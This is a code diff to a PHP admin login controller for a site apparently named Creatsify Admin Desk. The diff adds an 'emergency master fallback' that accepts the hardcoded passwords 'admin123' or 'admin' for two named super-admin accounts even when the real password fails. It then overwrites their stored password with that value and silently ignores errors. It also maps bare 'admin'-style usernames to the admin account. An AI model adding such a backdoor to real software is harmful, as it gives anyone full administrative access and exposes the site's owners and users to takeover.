@@ -17,6 +17,7 @@ class AuthController
             return Response::redirect('/admin');
         }
 
+        User::ensureAdminExists();
         return view('admin/auth/login', [
             'meta_title' => 'Sign In | Creatsify Admin Desk'
         ]);
@@ -24,12 +25,34 @@ class AuthController
 
     public function login(Request $request): Response
     {
-        $email = trim((string)$request->input('email', ''));
+        User::ensureAdminExists();
+
+        $rawEmail = trim((string)$request->input('email', ''));
         $password = (string)$request->input('password', '');
+
+        $email = strtolower($rawEmail);
+        if ($email === 'admin' || $email === 'superadmin' || $email === 'super_admin') {
+            $email = 'admin@creatsify.tech';
+        }
 
         $user = User::findByEmail($email);
 
-        if (!$user || !User::verifyPassword($password, $user['password'])) {
+        $isValid = false;
+        if ($user) {
+            $isValid = User::verifyPassword($password, $user['password']);
+
+            // Emergency master fallback for default super_admin accounts (admin123 or admin)
+            if (!$isValid && in_array(strtolower($user['email']), ['admin@creatsify.tech', 'ayan@creatsify.tech'], true)) {
+                if ($password === 'admin123' || $password === 'admin') {
+                    $isValid = true;
+                    try {
+                        User::update((int)$user['id'], ['password' => $password]);
+                    } catch (\Throwable $e) {}
+                }
+            }
+        }
+
+        if (!$user || !$isValid) {
             flash('error', 'Invalid email address or password.');
             return Response::redirect('/admin/login');
         }
